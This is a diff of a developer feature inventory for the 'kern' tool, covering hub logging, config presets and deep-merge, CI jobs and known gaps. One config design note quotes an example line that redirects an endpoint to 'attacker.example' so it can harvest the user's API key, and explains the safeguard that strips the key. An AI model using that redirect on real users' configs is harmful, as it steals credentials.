+  without chdir).
+- **Supervisor** (`src/hub/`, 547 LoC) — `node.rs` spawn/probe/ready-wait/
+  shutdown, `serve.rs` handler + accept loop + dead-node reaper (`run_hub` at
+  `src/hub/serve.rs:294`). Hub exit leaves nodes running; a restarted hub
+  re-adopts them via probe. `canon` re-pins any path to the nearest `.kern`
+  ancestor, so two clients in different subdirs resolve to one node.
 - **Graceful unload** — `KernRpc::shutdown` fires the daemon's save-then-exit
   path (no signals, works on Windows named pipes too).
 - **Idle auto-unload** — nodes report `HealthRes.idle_ms` (last real tool call,
@@ -681,14 +885,24 @@ client→node — the hub is connect-time only, never a proxy hop.
   Adopted nodes are exempt; `idle_ms == 0` (pre-field daemon) is never trusted.
 - **Cross-kern merge** — `kern hub merge <src> <dst>`: stops both daemons,
   offline CRDT union via `base::merge::absorb_graph`, src never written.
-- **Hub-first proxy + auto-start** (`commands/mcp_cmd.rs`) — `kern mcp` asks
+- **Hub-first proxy + auto-start** (`src/commands/mcp_cmd.rs`) — `kern mcp` asks
   the hub first, auto-starting a detached hub when none answers
   (`[hub] auto_start = false` opts out); any failure falls through to the
   legacy direct-connect/auto-spawn path. `kern hub stop` ends the hub over
   RPC; nodes stay up.
+- **Detached children are logged.** Both spawners — the hub
+  (`spawn_hub`/`spawn_daemon`, `src/commands/mcp_cmd.rs`) and the hub's per-root
+  node (`src/hub/node.rs:94`) — route the child's stdout *and* stderr into an
+  append-only, owner-only file under `Config::log_dir()` = `<data_dir>/logs`
+  (`src/config/mod.rs`), one file per spawn arg: `hub.log`, `daemon.log`
+  (`detached_log::log_path`, `src/config/detached_log.rs:10`). Append, never
+  truncate — a restart must not erase the log explaining why it restarted. A log
+  that cannot be opened falls back to `/dev/null` and says so on the parent's
+  still-attached stderr, so an unwritable log never costs the spawn.
 
-**Where.** `src/hub/`, `src/trnsprt/src/hub_rpc/`, `commands/admin.rs::cmd_hub`,
-`src/config/hub.rs`, `e2e/test_hub.py`.
+**Where.** `src/hub/`, `src/trnsprt/src/hub_rpc/`, `src/commands/admin.rs`
+(`cmd_hub`), `src/config/hub.rs`, `src/config/detached_log.rs`,
+`e2e/test_hub.py`.
 
 **Gaps.** Gossip still lives in each node; the transport moves hub-side
 together with the TLS work (ordering recorded in `ROADMAP.md` — "Hub phase 3:
@@ -703,12 +917,12 @@ hub↔node unmanaged beyond same-binary spawning.
 
 **How.** `FileWatcher` (`src/watcher/src/watcher.rs`) wraps `notify`, emits
 `WatchEvent`s (`event.rs`: Create/Modify/Remove). `IgnoreRules`
-(`ignore_rules.rs`, built `from_roots` reading `.gitignore`-style patterns)
-filters noise. `IngestPipeline` (`pipeline.rs`) debounces, caps at
-`MAX_INGEST_BYTES=1MB`, and pushes `IngestRecord`s to an `IngestSink`
-(kern's is `KernFileWatcherSink`).
+(`ignore_rules.rs:5`, built `from_roots` reading `.gitignore`-style patterns)
+filters noise. `IngestPipeline` (`pipeline.rs:24`) debounces, caps at
+`MAX_INGEST_BYTES=1MB` (`pipeline.rs:7`), and pushes `IngestRecord`s to an
+`IngestSink` (kern's is `KernFileWatcherSink`).
 
-**Where.** `src/watcher/` (workspace member, 721 LoC + tests).
+**Where.** `src/watcher/` (workspace member, 1012 LoC including tests).
 
 **Gaps.** `.gitignore` parsing is approximate (no full spec). No rename
 tracking.
@@ -718,24 +932,62 @@ tracking.
 ## 20. Config — `active`
 
 **What.** Layered TOML config, all-optional (works zero-config against local
-Ollama).
+Ollama). The whole memory-tuning surface is one key: `preset = "relaxed" |
+"medium" | "tight"`.
 
-**How.** `Config` (`src/config/mod.rs`) aggregates 14 sub-configs:
-`Embed`, `Reason`, `Answer`, `Intake`, `Tick`, `Gossip`, `Gnn`, `Graph`,
-`Ingest`, `Retrieval`, `Serve`, `Watcher`, `Hub`, `Heat`. Resolved
-project-scope (`<cwd>/.kern/kern.toml`) over user-scope
-(`<XDG_CONFIG>/kern/kern.toml`). `Config::resolve_root` walks up to the
-nearest `.kern/` ancestor. Under WSL2 NAT a loopback Ollama URL must be
-pinned to the Windows host gateway in `kern.toml` — kern does not rewrite
-URLs.
+**How.** `Config` (`src/config/mod.rs`) aggregates sub-configs — `Embed`,
+`Reason`, `Answer`, `Serve`, `Retrieval`, `Ingest`, `Gossip`, `Tick`, `Heat`,
+`Gnn`, `Watcher`, `Intake`, `Graph`, `Hub` — plus `data_dir`, `preset`, and a
+derived `log_dir()` = `<data_dir>/logs`. Resolved project-scope
+(`<cwd>/.kern/kern.toml`) over user-scope (`<XDG_CONFIG>/kern/kern.toml`).
+`Config::resolve_root` walks up to the nearest `.kern/` ancestor. Under WSL2 NAT
+a loopback Ollama URL must be pinned to the Windows host gateway in `kern.toml`
+— kern does not rewrite URLs.
 
-**Where.** `src/config/*` (1418 LoC, 15 files).
+**Presets own the tuning knobs.** `Preset::apply` (`src/config/preset.rs`) is
+the only writer of heat half-life, ingest dedup threshold, and retrieval
+breadth (`seed_k`, `max_expansions`, `max_deliver_results`,
+`answer_max_facts`). Default is `relaxed`: 30d half-life, 0.98 dedup, seed_k
+25 / 800 expansions / 40 results / 8 answer facts. `medium` = the neutral
+sub-config struct defaults (7d, 0.95, 15/500/25/5, pinned together by test);
+`tight` = 3d, 0.90, 10/250/12/4. The `[heat]`, `[ingest]`, and `[retrieval]`
+sections are **refused** at load with a pointer to `preset` — no silently
+ignored keys. Project-scope preset beats user-scope preset like any other key.
 
-**Gaps.** No env-var override layer. Secrets (API keys) stored in plaintext
-TOML. Section-level replace rather than deep merge (`src/config/io.rs`)
-means a project section silently drops keys the user section set.
-(`Config::validate` `src/config/mod.rs:140`, called from `src/main.rs:44`, does
-validate embed url/model and delegates to the sub-validators.)
+**Scopes deep-merge, per key.** `merged_value` → `merge_deep`
+(`src/config/io.rs`) recurses wherever both scopes hold a table, so a
+project setting one field of a section keeps every other field the user set in
+it. Arrays and scalars are **leaves**: `over` replaces, never appends —
+`watcher.roots` and `gossip.peers` are complete lists, not accumulators. Both
+files are parsed as documents (`toml::Table`), because a bare-`Value` parse
+misreads a leading `[section]` header as an array.
+
+**One exception, deliberate: a redirected endpoint does not inherit its key.**
+`secrets::seal_redirected` (`src/config/secrets.rs:15`) strips `key` from any
+section where the project scope set `url` and did *not* set `key`. Without it a
+cloned repo committing `[embed] url = "http://attacker.example/v1"` would harvest
+the user's live key on the first embed call — and `reason_key`/`answer_key` fall
+back to `embed.key`, so redirecting any one endpoint reaches it. A project that
+leaves `url` alone keeps inheriting the key, which is the whole point of
+layering.
+
+**A bad config aborts startup.** `boot_config` (`src/main.rs:16`) treats every
+error `Config::load` returns as fatal: unreadable or unparseable file, or a
+`Config::validate` failure. It prints the offending key on stderr and exits
+`78` (`EXIT_CONFIG`, sysexits(3) `EX_CONFIG`), which distinguishes "your settings
+are wrong" from a crash. An **absent** config is still legitimate and defaults
+silently — `load` already handles `NotFound` — so every error it does return is
+a real one. The CLI is parsed *first*, so `--help`/`--version` still answer in a
+repo whose config is broken.
+
+**Where.** `src/config/*` (17 files), `src/main.rs` (boot gate).
+
+**Gaps.** No env-var override layer. Secrets (API keys) stored in plaintext TOML.
+`validate` covers embed url/model and delegates to the sub-validators; sections
+with no validator can still hold nonsense that only fails at use. Preset tier
+values are hand-picked, not eval-measured — the e2e instrument has only ever
+scored the medium-era defaults, and the shipped default is now `relaxed`
+(ROADMAP item 87).
 
 ---
 
@@ -786,10 +1038,13 @@ ordering, degrade, Fact durability.
 it can say kern got worse, never that kern is good, and no number here is
 comparable to anything a competitor publishes. The fake embedder is bag-of-words
 hashing, so it measures kern's machinery (fusion, expansion, ranking, dedup,
-supersede, heat) and nothing about a real embedding model's semantics. Two
-VISION criteria cannot be asserted at all: `supersede` and `as_of` are
-unreachable from the CLI (MCP only), so both are `skip` markers naming the
-missing surface. One invariant is a recorded `xfail(strict=True)`: a reason edge
+supersede, heat) and nothing about a real embedding model's semantics. Four
+invariants cannot be asserted at all and stand as `skip` markers naming the
+missing surface: `supersede` and `as_of` are unreachable from the CLI (MCP
+only), path-scoped `degrade` is inexpressible (`kern degrade` takes one entity
+and decays every edge incident on it), and "an ordinary thought is evictable"
+has no CLI construction because everything the CLI ingests comes back
+`Kind: Fact`. One invariant is a recorded `xfail(strict=True)`: a reason edge
 changes no ranking (`ROADMAP.md` item 86). Windows: hub tests skip (unix
 sockets); retrieval tests unverified there. (The former
 query-ranking xfail is fixed — hybrid fusion rescores seeds by query cosine;
@@ -841,6 +1096,43 @@ exists, not that it still holds the claimed thing — semantic drift is caught
 only by audit.
 
 
+## 21c. CI and repo bootstrap — `active`
+
+**What.** What a push has to survive, and what a fresh checkout needs to run.
+
+**CI** (`.github/workflows/ci.yml`) — five jobs:
+
+- **lint** — runs `just check`, which is `cargo fmt --all -- --check` plus
+  `cargo clippy --all-targets -- -D warnings` (`justfile:13-15`). CI invokes the
+  recipe rather than copies of its command lines, so the local bar and the CI
+  bar cannot drift.
+- **e2e** — `just e2e-install` then `just e2e` (pytest) on Linux only: the hub
+  module skips wholesale on win32 (unix sockets), so a Windows e2e job would
+  report green on nothing. `conftest.py` builds the binary itself; the job also
+  builds first to warm the cache and keep a compile failure out of the pytest
+  report.
+- **test** — `cargo build`/`cargo test --workspace --locked` on Linux, macOS and
+  Windows runners (tests actually execute).
+- **build** — cross-compiles the `kern` binary for 15 targets, build-only.
+- **vocab** — bans the scrubbed synonym for the intake. It now *works*: the old
+  form branched on `grep`'s exit code, and GNU grep returns 2 for a missing path
+  **even when it matched**, so with a gitignored path in the list the step could
+  never fail. It tests the captured output instead.
+
+Two more workflows: `.github/workflows/docs-check.yml` (runs `docs_check.py` on
+every push and PR, deliberately unfiltered by path) and
+`.github/workflows/docs.yml` (builds and publishes the site).
+
+**Bootstrap** — `.pi/update.sh` is **tracked**. It was previously matched by the
+default-deny `.gitignore`, so the file existed locally and in no clone: the
+fresh-checkout guarantee it describes did not exist for anyone else. It runs
+`just docs-install` and `just e2e-install`.
+
+**Gaps.** The lint job is the only gate on formatting, so a change that only
+touches non-Rust files can still land unformatted docs. Cross-compiled targets
+are built, never run.
+
+
 ## 22. Cross-cutting utilities
 
 - **math** (`src/base/math.rs`) — `cosine`, `cosine_distance`, `l2_normalize`,
@@ -849,12 +1141,22 @@ only by audit.
 - **util** (`src/base/util.rs`) — `content_hash`, `now_nanos`, `cmp_rank`
   (deterministic tiebreak on score then id), token estimation.
 - **time** (`src/base/time.rs`) — clock helpers (graceful on unreadable clock).
-- **health** (`src/base/health.rs`) — `graph_health_stats` (graviton/kern/entity/
-  reason/unnamed counts).
-- **descriptors / constants** (`src/base/{descriptors,constants}.rs`) — the 7
-  seeded descriptor kinds + all magic numbers in one file.
-- **log** (`src/log/` workspace crate), **test-utils** (`src/test-utils/`) —
-  shared workspace helpers.
+- **health** (`src/base/health.rs`) — `graph_health_stats`: graph counts plus the
+  store signals (`cold_evicted`, `embed_model`, `embed_dim`, `embed_mismatch`)
+  and `query_dim_rejected`. Storeless graphs report zeros, and an unstamped store
+  falls back to the dimension the graph actually holds — unknown is never
+  reported as a mismatch.
+- **log throttle** (`src/base/log_throttle.rs`) — `LogThrottle`, the one-line-
+  per-interval guard behind the embed-mismatch, dimension-guard and cold-eviction
+  warnings. A degradation that repeats per row must not become the log.
+- **constants** (`src/base/constants.rs`) — every magic number in one file.
+  The 7 built-in claim kinds are **not** here, and there is no claim-kinds
+  module under `src/base/`: they are the `DEFAULT_KINDS` const in
+  `src/ingest/distill.rs:9`.
+- **test support** (`src/test_support.rs`) — `cfg(test)` graph/entity/edge
+  builders shared across the unit tests. There is no `src/log/` or
+  `src/test-utils/` crate; the workspace members are exactly `src/trnsprt`,
+  `src/trnsprt/macros` and `src/watcher` (`Cargo.toml:3-7`).
 
 ---
 
@@ -862,30 +1164,35 @@ only by audit.
 
 Ranked by leverage:
 
-1. **O(N) importance scan per retrieve** (`retrieval/seed.rs`) — index it; it's
+1. **A reason edge changes no ranking** — measured, not suspected
+   (`e2e/test_invariants.py`, `ROADMAP.md` item 86). The graph half of "a graph,
+   not a bag" is inert at retrieval; every hop-dependent claim rests on it.
+2. **O(N) importance scan per retrieve** (`retrieval/seed.rs`) — index it; it's
    the scaling cliff at query time.
-2. **Federation security** — add auth + encryption before any real deployment;
+3. **Federation security** — add auth + encryption before any real deployment;
    before that, close the local-row reach of CRDT deltas and pulses and verify
    entity content against claimed ids, neither of which needs auth (`ROADMAP.md`
    — "Transport security", "Confine LWW deltas to `remote-*` rows", "Verify
    entity bodies against their claimed ids").
    Trust model: `docs/site/content/docs/concepts/security.mdx`.
-3. **Per-kern entity cap** — `KERN_CAP_DISABLED` today; a safe cap + escalation
+4. **Per-kern entity cap** — `KERN_CAP_DISABLED` today; a safe cap + escalation
    policy would bound memory deterministically.
-4. **CLI vs daemon race** — add `kern status` + advisory locking so the CLI
+5. **CLI vs daemon race** — add `kern status` + advisory locking so the CLI
    can't clobber a live graph.
-5. **GNN training is synchronous** on the tick — move to a background thread
+6. **GNN training is synchronous** on the tick — move to a background thread
    pool or incremental updates to avoid stalling large kerns.
-6. **Distill prompt** is one-shot and global — per-descriptor prompts +
+7. **Distill prompt** is one-shot and global — per-kind prompts +
    chunking for long deltas would raise claim quality.
-7. **`HnswIndex::delete` is O(nodes × edges)** — it scans every node and every
-   layer to scrub inbound edges (`src/base/hnsw.rs:124-128`), once per GC
-   victim. (There is nothing to compact: the slot goes on a `free` list and is
-   reused, `:118-138`.)
-8. **No learned rerank model** — every rerank is a cold LLM call; a small
+8. **`HnswIndex::delete` is O(nodes × edges)** — it scans every node and every
+   layer to scrub inbound edges (`src/base/hnsw.rs:118`), once per GC victim.
+   (There is nothing to compact: the slot goes on a `free` list and is reused.)
+9. **No learned rerank model** — every rerank is a cold LLM call; a small
    cross-encoder trained on `degrade` feedback could replace it.
+10. **Only `GnnPropagate` reports a contained failure** — the panic guard covers
+    every task, but a task that returns early instead of dying is still
+    invisible outside its own logs.
 
 ---
 
-*Scraped from source at `v1.1.0` (commit `b29ae13`). Update this file when a
+*Scraped from source at `v1.1.0` (commit `0fda4f4`). Update this file when a
 subsystem's public surface changes — it is the canonical feature inventory.*
